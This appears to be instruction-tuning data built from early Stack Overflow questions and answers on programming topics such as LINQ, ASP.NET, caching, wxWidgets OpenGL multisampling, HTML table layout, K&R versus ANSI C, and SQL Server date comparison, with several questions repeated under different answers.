{"instruction": "I'm tired of being in the middle of typing something, having a pop-up with a question appear, and hitting enter before reading it... (it also happens with some windows that are not pop-ups)\nDo you know if there's some setting I could touch for this not to happen?", "output": "Actually Windows XP tries to avoid that. Of course some programs found a way to circumvented that. Microsoft Powertoy TweakUI has a way to turn the option on again in case it was turned off. You could also edit the registry yourself using the following information."}
{"instruction": "I seem to be missing something about LINQ.  To me, it looks like it's taking some of the elements of SQL that I like the least and moving them into the C# language and using them for other things.\nI mean, I could see the benefit of using SQL-like statements on things other than databases.  But if I wanted to write SQL, well, why not just write SQL and keep it out of C#?  What am I missing here?", "output": "The point is that LINQ integrates your queries into your primary programming language, allowing your IDE to provide you with some facilities (Intellisense and debug support, for example) that you otherwise would not have, and to allow the compiler to type-check your SQL code (which is impossible with a normal string query)."}
{"instruction": "I seem to be missing something about LINQ.  To me, it looks like it's taking some of the elements of SQL that I like the least and moving them into the C# language and using them for other things.\nI mean, I could see the benefit of using SQL-like statements on things other than databases.  But if I wanted to write SQL, well, why not just write SQL and keep it out of C#?  What am I missing here?", "output": "LINQ is not about SQL. LINQ is about being apply functional programming paradigmns on objects.\nLINQ to SQL is an ORM built ontop of the LINQ foundation, but LINQ is much more. I don't use LINQ to SQL, yet I use LINQ all the time.\nTake the task of finding the intersection of two lists:\nBefore LINQ, this tasks requires writing a nested foreach that iterates the small list once for every item in the big list O(N*M), and takes about 10 lines of code.\nforeach (int number in list1)\n{\n    foreach (int number2 in list2)\n    {\n        if (number2 == number)\n        {\n            returnList.add(number2);\n        }\n    }\n}\n\nUsing LINQ, it does the same thing in one line of code:\nvar results = list1.Intersect(list2);\n\nYou'll notice that doesn't look like LINQ, yet it is. You don't need to use the expression syntax if you don't want to."}
{"instruction": "I have a bunch of files (TV episodes, although that is fairly arbitrary) that I want to check match a specific naming/organisation scheme..\nCurrently: I have three arrays of regex, one for valid filenames, one for files missing an episode name, and one for valid paths.\nThen, I loop though each valid-filename regex, if it matches, append it to a \"valid\" dict, if not, do the same with the missing-ep-name regexs, if it matches this I append it to an \"invalid\" dict with an error code (2:'missing epsiode name'), if it matches neither, it gets added to invalid with the 'malformed name' error code.\nThe current code can be found here\nI want to add a rule that checks for the presence of a folder.jpg file in each directory, but to add this would make the code substantially more messy in it's current state.. \nHow could I write this system in a more expandable way?\nThe rules it needs to check would be..\n\nFile is in the format Show Name - [01x23] - Episode Name.avi or Show Name - [01xSpecial02] - Special Name.avi or Show Name - [01xExtra01] - Extra Name.avi\nIf filename is in the format Show Name - [01x23].avi display it a 'missing episode name' section of the output\nThe path should be in the format Show Name/season 2/the_file.avi (where season 2 should be the correct season number in the filename)\neach Show Name/season 1/ folder should contain \"folder.jpg\"\n\n.any ideas? While I'm trying to check TV episodes, this concept/code should be able to apply to many things..\nThe only thought I had was a list of dicts in the format:\nchecker = [\n{\n    'name':'valid files',\n    'type':'file',\n    'function':check_valid(), # runs check_valid() on all files\n    'status':0 # if it returns True, this is the status the file gets\n}", "output": "I want to add a rule that checks for\n  the presence of a folder.jpg file in\n  each directory, but to add this would\n  make the code substantially more messy\n  in it's current state..\n\nThis doesn't look bad.  In fact your current code does it very nicely, and Sven mentioned a good way to do it as well:\n\nGet a list of all the files\nCheck for \"required\" files\n\nYou would just have have add to your dictionary a list of required files:\nchecker = {\n  ...\n  'required': ['file', 'list', 'for_required']\n}\n\nAs far as there being a better/extensible way to do this?  I am not exactly sure.  I could only really think of a way to possibly drop the \"multiple\" regular expressions and build off of Sven's idea for using a delimiter.  So my strategy would be defining a dictionary as follows (and I'm sorry I don't know Python syntax and I'm a tad to lazy to look it up but it should make sense.  The /regex/ is shorthand for a regex):\ncheck_dict = {\n  'delim'    : /\\-/,\n  'parts'    : [ 'Show Name', 'Episode Name', 'Episode Number' ],\n  'patterns' : [/valid name/, /valid episode name/, /valid number/ ],\n  'required' : ['list', 'of', 'files'],\n  'ignored'  : ['.*', 'hidden.txt'],\n  'start_dir': '/path/to/dir/to/test/'\n}\n\n\nSplit the filename based on the delimiter.\nCheck each of the parts.\n\nBecause its an ordered list you can determine what parts are missing and if a section doesn't match any pattern it is malformed.  Here the parts and patterns have a 1 to 1 ratio.  Two arrays instead of a dictionary enforces the order.\nIgnored and required files can be listed.  The . and .. files should probably be ignored automatically.  The user should be allowed to input \"globs\" which can be shell expanded.  I'm thinking here of svn:ignore properties, but globbing is natural for listing files.\nHere start_dir would be default to the current directory but if you wanted a single file to run automated testing of a bunch of directories this would be useful.\nThe real loose end here is the path template and along the same lines what path is required for \"valid files\".  I really couldn't come up with a solid idea without writing one large regular expression and taking groups from it... to build a template.  It felt a lot like writing a TextMate language grammar.  But that starts to stray on the ease of use.  The real problem was that the path template was not composed of parts, which makes sense but adds complexity.\nIs this strategy in tune with what you were thinking of?"}
{"instruction": "I seem to be missing something about LINQ.  To me, it looks like it's taking some of the elements of SQL that I like the least and moving them into the C# language and using them for other things.\nI mean, I could see the benefit of using SQL-like statements on things other than databases.  But if I wanted to write SQL, well, why not just write SQL and keep it out of C#?  What am I missing here?", "output": "So the really, really big deal about LINQ has nothing to do with Linq to SQL. It's about the enhancements it brought to the C# language itself."}
{"instruction": "I seem to be missing something about LINQ.  To me, it looks like it's taking some of the elements of SQL that I like the least and moving them into the C# language and using them for other things.\nI mean, I could see the benefit of using SQL-like statements on things other than databases.  But if I wanted to write SQL, well, why not just write SQL and keep it out of C#?  What am I missing here?", "output": "LINQ is not just an ORM system, as Jonathan pointed out it brings a lot of functional programming elements to C#. And it lets you do a lot of \"database-y\" things in regular C# code. It's difficult to explain just how incredibly powerful that can be. Consider how much having solid, well designed generic data structures (such as list, stack, dictionary/hash, etc.) included in common frameworks has improved the state of development in modern languages. Precisely because using these data structures is very common and reducing the intellectual overhead of using them is a huge benefit. LINQ doesn't do anything you can't do yourself, but it makes a lot of operations a lot more straightforward and a lot easier.\nConsider the time-honored example of removing duplicates from a non-ordered list. In a lower level language like C or C++ you'd probably have to sort the list and maintain two indices into the list as you removed dupes. In a language with hashes (Java, C#, Javascript, Perl, etc.) you could create a hash where the keys are the unique values, then extract the keys into a new list. With LINQ you could just do this:\nint[] data = { 0, 1, 3, 3, 7, 8, 0, 9, 2, 1 };\n\nvar uniqueData = data.GroupBy(i => i).Select(g => g.Key);"}
{"instruction": "I'm tired of being in the middle of typing something, having a pop-up with a question appear, and hitting enter before reading it... (it also happens with some windows that are not pop-ups)\nDo you know if there's some setting I could touch for this not to happen?", "output": "It suppose to be a registry change  that helps with this type of situations (mentioned in this Coding Horror post about the subject of \"focus stealing\"). I try it, it doesn't work with all popups but helps with some of them, causing the offending application to flash in the taskbar instead of gain focus."}
{"instruction": "I know Hostmonster allows Python. Has anyone successfully run Django on there? Any problems?", "output": "Well, if it support Python, you might be able to run Django using a FastCGI setup, as described here: FastCGI Docs. If it supports mod_python (which I guess it's what you mean), then sure, you can install it using the steps listed here: ModPython docs"}
{"instruction": "Is there a simple way in .NET to quickly get the current protocol, host, and port? For example, if I'm on the following URL:\nhttp://www.mywebsite.com:80/pages/page1.aspx\nI need to return:\nhttp://www.mywebsite.com:80\nI know I can use Request.Url.AbsoluteUri to get the complete URL, and I know I can use Request.Url.Authority to get the host and port, but I'm not sure of the best way to get the protocol without parsing out the URL string.\nAny suggestions?", "output": "Request.Url will return you the Uri of the request.  Once you have that, you can retrieve pretty much anything you want.  To get the protocol, call the Scheme property.\nSample:\nUri url = Request.Url;\nstring protocol = url.Scheme;\n\nHope this helps."}
{"instruction": "For a .NET component that will be used in both web applications and rich client applications, there seem to be two obvious options for caching: System.Web.Caching or the Ent. Lib. Caching Block.\n\nWhat do you use?\nWhy?\n\nSystem.Web.Caching\nIs this safe to use outside of web apps?  I've seen mixed information, but I think the answer is maybe-kind-of-not-really.\n\na KB article warning against 1.0 and 1.1 non web app use\nThe 2.0 page has a comment that indicates it's OK: http://msdn.microsoft.com/en-us/library/system.web.caching.cache(VS.80).aspx\nScott Hanselman is creeped out by the notion\nThe 3.5 page includes a warning against such use\nRob Howard encouraged use outside of web apps\n\nI don't expect to use one of its highlights, SqlCacheDependency, but the addition of CacheItemUpdateCallback in .NET 3.5 seems like a Really Good Thing.  \nEnterprise Library Caching Application Block\n\nother blocks are already in use so the dependency already exists\ncache persistence isn't necessary; regenerating the cache on restart is OK\n\nSome cache items should always be available, but be refreshed periodically.  For these items, getting a callback after an item has been removed is not very convenient.  It looks like a client will have to just sleep and poll until the cache item is repopulated.\nMemcached for Win32 + .NET client\nWhat are the pros and cons when you don't need a distributed cache?", "output": "Take a look at memcached.  It is a really cool, fast and lightweight distributed caching system.  There are APIs for several of the most popular languages, including C#.  It may not serve well on the client side (unless of course the client is obtaining the cached data from a server of some kind), but if you abstract your usage of memcached to a specific interface, you could then implement the interface with another caching system."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "There's two questions here: Silverlight vs. Flash as platform and Silverlight vs. Flex as RIA framework.\nThe first question depends on your timeframe. Flash Player has over 95% reach, Silverlight has no way near that. However, Silverlight may get there, it is after all backed by Microsoft. If you aim to launch a site next week and want a huge audience, Silverlight is not an option. If you aim to launch a really cool application that everyone would want to use it's a bit different, if your app is good enough your target audience may install Silverlight just to be able to run it.\nAs for the second question its a matter of how easy it is to develop applications in Silverlight. Flex isn't just a set of widgets, it's a very big framework that does a lot of thing that ease the work of the developer. You could write the same applications using only the core Flash API, but it would be very much more work. Depending on what's available in Silverlight, this should be an important factor when deciding. If you can cut development time, is having two platforms worth it?"}
{"instruction": "Multisampling is a way of applying full screen anti-aliasing (FSAA) in 3D applications. I need to use multisampling in my OpenGL program, which is currently embedded in a wxWidgets GUI. Is there a way to do this? Please respond only if you know the detailed steps to achieve this.\nI'm aware of enabling multisampling using WGL (Win32 extensions to OpenGL). However, since my OpenGL program isn't written in MFC (and I want the code to be multi-platform portable), that's not an option for me.", "output": "I finally got Multisampling working with my wxWidgets OpenGL program. It's a bit messy right now, but here's how:\nwxWidgets doesn't have Multisampling support in their stable releases right now (latest version at this time is 2.8.8). But, it's available as a patch and also through their daily snapshot. (The latter is heartening, since it means that the patch has been accepted and should appear in later stable releases if there are no issues.)\nSo, there are 2 options:\n\nDownload and build from their daily snapshot.\nGet the patch for your working wxWidgets installation.\n\nI found the 2nd option to be less cumbersome, since I don't want to disturb my working installation as much as possible. If you don't know how to patch on Windows, see this.\nAt the very least, for Windows, the patch will modify the following files:\n$(WX_WIDGETS_ROOT)/include/wx/glcanvas.h\n$(WX_WIDGETS_ROOT)/include/wx/msw/glcanvas.h\n$(WX_WIDGETS_ROOT)/src/msw/glcanvas.cpp\n\nAfter patching, recompile the wxWidgets libraries.\nTo enable multisampling in your wxWidgets OpenGL program, minor changes to the code are required.\nAn attribute list needs to be passed to the wxGLCanvas constructor:\nint attribList[] = {WX_GL_RGBA,\n                    WX_GL_DOUBLEBUFFER,\n                    WX_GL_SAMPLE_BUFFERS, GL_TRUE, // Multi-sampling\n                    WX_GL_DEPTH_SIZE, 16,\n                    0, 0};\n\nIf you were already using an attribute list, then add the line with GL_SAMPLE_BUFFERS, GL_TRUE to it. Else, add this attribute list definition to your code.\nThen modify your wxGLCanvas constructor to take this attribute list as a parameter:\nmyGLFrame::myGLFrame    // Derived from wxGLCanvas\n(\n    wxWindow *parent,\n    wxWindowID id,\n    const wxPoint& pos,\n    const wxSize& size,\n    long style,\n    const wxString& name\n)\n: wxGLCanvas(parent, (wxGLCanvas*) NULL, id, pos, size, style, name, attribList)\n{\n    // ...\n}\n\nAfter the wxGLCanvas element is created, multisampling is turned on by default. To disable or enable it at will, use the related OpenGL calls:\nglEnable(GL_MULTISAMPLE);\nglDisable(GL_MULTISAMPLE);\n\nMultisampling should now work with the wxWidgets OpenGL program. Hopefully, it should be supported in the stable release of wxWidgets soon, making this information irrelevant :-)"}
{"instruction": "For a .NET component that will be used in both web applications and rich client applications, there seem to be two obvious options for caching: System.Web.Caching or the Ent. Lib. Caching Block.\n\nWhat do you use?\nWhy?\n\nSystem.Web.Caching\nIs this safe to use outside of web apps?  I've seen mixed information, but I think the answer is maybe-kind-of-not-really.\n\na KB article warning against 1.0 and 1.1 non web app use\nThe 2.0 page has a comment that indicates it's OK: http://msdn.microsoft.com/en-us/library/system.web.caching.cache(VS.80).aspx\nScott Hanselman is creeped out by the notion\nThe 3.5 page includes a warning against such use\nRob Howard encouraged use outside of web apps\n\nI don't expect to use one of its highlights, SqlCacheDependency, but the addition of CacheItemUpdateCallback in .NET 3.5 seems like a Really Good Thing.  \nEnterprise Library Caching Application Block\n\nother blocks are already in use so the dependency already exists\ncache persistence isn't necessary; regenerating the cache on restart is OK\n\nSome cache items should always be available, but be refreshed periodically.  For these items, getting a callback after an item has been removed is not very convenient.  It looks like a client will have to just sleep and poll until the cache item is repopulated.\nMemcached for Win32 + .NET client\nWhat are the pros and cons when you don't need a distributed cache?", "output": "Bear in mind that the EntLib documentation specifically steers you towards the ASP.NET cache for ASP.NET applications. That's probably the strongest recommendation towards using it here. Plus the EntLib cache doesn't have dependencies, which for me is a big reason not to use it.\nI don't think there's a technical limitation as such on shipping System.Web as part of your app, though it's slightly odd that they've put that notice in on the .NET 3.5 page. Hanselman actually says he started out being creeped out by this notion, but became convinced. Also if you read the comments, he says that the block has too many moving parts and the ASP.NET Cache is much more lightweght.\nI think this is exactly the kind of problem that Velocity is going to solve, but that's only a preview for now :-(  \nI'd say use Web.Caching and see how you get on. If you put some kind of abstraction layer over the top of it, you've always got the option to swap it out for the EntLib block later on if you find problems."}
{"instruction": "I've created a map system for a game that runs on the principle of drawing the picture of the map from tiles. There are many reasons for this which I won't go into here but if you really want to know then I'm sure you can find out how to contact me ;)\nI have made the latest version live so you can see exactly where the problem lies and the source. The issue is the line between the top 2 tiles and the bottom 2 tiles, I can't figure out why it's gone like this and any help would be appreciated.\nIn the source is a marker called \"stackoverflow\", if you search for \"stackoverflow\" when viewing source then it should take you to the table in question.\nI have also uploaded an image of the issue.", "output": "I know this might sound bad, but you need to ensure there is no whitespace between then end of you <img> tag and the start of the end </td> tag.\ni.e. The following will present the problem:\n<td>\n <img src=\"image.jpg\"/>\n</td>\n\nAnd this will not:\n<td><img src=\"image.jpg\"/></td>\n\nHope that helps.\nEdit: OK, that wasn't the solution at all. doh!"}
{"instruction": "I've created a map system for a game that runs on the principle of drawing the picture of the map from tiles. There are many reasons for this which I won't go into here but if you really want to know then I'm sure you can find out how to contact me ;)\nI have made the latest version live so you can see exactly where the problem lies and the source. The issue is the line between the top 2 tiles and the bottom 2 tiles, I can't figure out why it's gone like this and any help would be appreciated.\nIn the source is a marker called \"stackoverflow\", if you search for \"stackoverflow\" when viewing source then it should take you to the table in question.\nI have also uploaded an image of the issue.", "output": "I haven't looked up the whole thing, but the problem lies somewhere in the style sheets.\nIf you copy out only the table part of it, it is displaying the map correctly.\nIf you remove the final </span> tag from this part, it is also working (however the page gets mixed):\n<div class=\"inner\"><span class=\"corners-top\"><span></span></span>\n<div class=\"content\" style=\"font-size: 1.1em;\">\n\n<!-- Stackoverflow findy thingy -->\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n\nSo either try from the beginning with the css or try to remove one-by-one them, to see, which is causing the problem."}
{"instruction": "I've created a map system for a game that runs on the principle of drawing the picture of the map from tiles. There are many reasons for this which I won't go into here but if you really want to know then I'm sure you can find out how to contact me ;)\nI have made the latest version live so you can see exactly where the problem lies and the source. The issue is the line between the top 2 tiles and the bottom 2 tiles, I can't figure out why it's gone like this and any help would be appreciated.\nIn the source is a marker called \"stackoverflow\", if you search for \"stackoverflow\" when viewing source then it should take you to the table in question.\nI have also uploaded an image of the issue.", "output": "I think you need to use display: block on your images. When images are inline there's a little extra space for the line spacing."}
{"instruction": "I've created a map system for a game that runs on the principle of drawing the picture of the map from tiles. There are many reasons for this which I won't go into here but if you really want to know then I'm sure you can find out how to contact me ;)\nI have made the latest version live so you can see exactly where the problem lies and the source. The issue is the line between the top 2 tiles and the bottom 2 tiles, I can't figure out why it's gone like this and any help would be appreciated.\nIn the source is a marker called \"stackoverflow\", if you search for \"stackoverflow\" when viewing source then it should take you to the table in question.\nI have also uploaded an image of the issue.", "output": "You could also adjust the line height of the td element:\ntd {\n    line-height: 0\n}"}
{"instruction": "As part of our product release we ship Apache HTTP Server binaries that we have compiled on our (UNIX) development machine.\nWe tell our clients to install the binaries (on their UNIX servers) under the same directory structure that we compiled it under. For some clients this is not appropriate, e.g. where there are restrictions on where they can install software on their servers and they don't want to compile Apache themselves.\nIs there a way of compiling Apache HTTP Server so its installation location(s) can be specified dynamically using environment variables ?\nI spent a few days trying to sort this out and couldn't find a way to do it. It led me to believe that the Apache binaries were hard coding some directory paths at compilation preventing the portability we require.\nHas anyone managed to do this ?", "output": "I think the way to do(get around) this problem is to develop a \"./configure && make\" script that your client uses to install, specify and compile the binaries. That would offcourse require that the client has all the source-code installed on his server or you can make it available on an NFS share."}
{"instruction": "I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).", "output": "There is Castle.Components.Validator module in Castle project. It's very agile and powerfull. It generates validation rules based on model attributes (or any other source) and even able to generate JS validation using jQuery, Prototype Validation, fValidate and other.\nOf course it's wise to abstract validator away behind IValidationEngine interface."}
{"instruction": "Is there a simple way in .NET to quickly get the current protocol, host, and port? For example, if I'm on the following URL:\nhttp://www.mywebsite.com:80/pages/page1.aspx\nI need to return:\nhttp://www.mywebsite.com:80\nI know I can use Request.Url.AbsoluteUri to get the complete URL, and I know I can use Request.Url.Authority to get the host and port, but I'm not sure of the best way to get the protocol without parsing out the URL string.\nAny suggestions?", "output": "The following (C#) code should do the trick\nUri uri = new Uri(\"http://www.mywebsite.com:80/pages/page1.aspx\");\nstring requested = uri.Scheme + Uri.SchemeDelimiter + uri.Host + \":\" + uri.Port;"}
{"instruction": "The Wikipedia article on ANSI C says:\n\nOne of the aims of the ANSI C standardization process was to produce a superset of K&R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.\n\nThat makes me think that there are differences. However, I didn't see a comparison between K&R C and ANSI C. Is there such a document? If not, what are the major differences?\nEDIT: I believe the K&R book says \"ANSI C\" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?", "output": "The biggest single difference, I think, is function prototyping and the syntax for describing the types of function arguments."}
{"instruction": "The Wikipedia article on ANSI C says:\n\nOne of the aims of the ANSI C standardization process was to produce a superset of K&R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.\n\nThat makes me think that there are differences. However, I didn't see a comparison between K&R C and ANSI C. Is there such a document? If not, what are the major differences?\nEDIT: I believe the K&R book says \"ANSI C\" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?", "output": "There are some minor differences, but I think later editions of K&R are for ANSI C, so there's no real difference anymore.\n\"C Classic\" for lack of a better terms had a slightly different way of defining functions, i.e.  \nint f( p, q, r )  \nint p, float q, double r;  \n{  \n    // Code goes here  \n}\n\nI believe the other difference was function prototypes. Prototypes didn't have to - in fact they couldn't - take a list of arguments or types. In ANSI C they do."}
{"instruction": "The Wikipedia article on ANSI C says:\n\nOne of the aims of the ANSI C standardization process was to produce a superset of K&R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.\n\nThat makes me think that there are differences. However, I didn't see a comparison between K&R C and ANSI C. Is there such a document? If not, what are the major differences?\nEDIT: I believe the K&R book says \"ANSI C\" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?", "output": "There may be some confusion here about what \"K&R C\" is. The term refers to the language as documented in the first edition of \"The C Programming Language.\" Roughly speaking: the input language of the Bell Labs C compiler circa 1978.\nKernighan and Ritchie were involved in the ANSI standardization process. The \"ANSI C\" dialect superceded \"K&R C\" and subsequent editions of \"The C Programming Language\" adopt the ANSI conventions. \"K&R C\" is a \"dead language,\" except to the extent that some compilers still accept legacy code."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "where\nyear(date1) = year(date2)\nand month(date1) = month(date2)\nand day(date1) = day(date2)"}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "This is much more concise:\nwhere \n  datediff(day, date1, date2) = 0"}
{"instruction": "We have a situation where users are allowed to upload content, and then separately make some changes, then submit a form based on those changes.\nThis works fine in a single-server, non-failover environment, however we would like some sort of solution for sharing the files between servers that supports failover.\nHas anyone run into this in the past?  And what kind of solutions were you able to develop?  Obviously persisting to the database is one option, but we'd prefer to avoid that.", "output": "In our scenario, we have a separate file server that both of our front end app servers write to, that way you either server has access to the same sets of files."}
{"instruction": "We have a situation where users are allowed to upload content, and then separately make some changes, then submit a form based on those changes.\nThis works fine in a single-server, non-failover environment, however we would like some sort of solution for sharing the files between servers that supports failover.\nHas anyone run into this in the past?  And what kind of solutions were you able to develop?  Obviously persisting to the database is one option, but we'd prefer to avoid that.", "output": "The best solution for this is usually to provide the shared area on some form of SAN, which will be accessible from all servers and contain failover.\nThis also has the benefit that you don't have to provide sticky load balancing, the upload can be handled by one server, and the edit by another."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "this will remove time component from a date for you:  \nselect dateadd(d, datediff(d, 0, current_timestamp), 0)"}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = 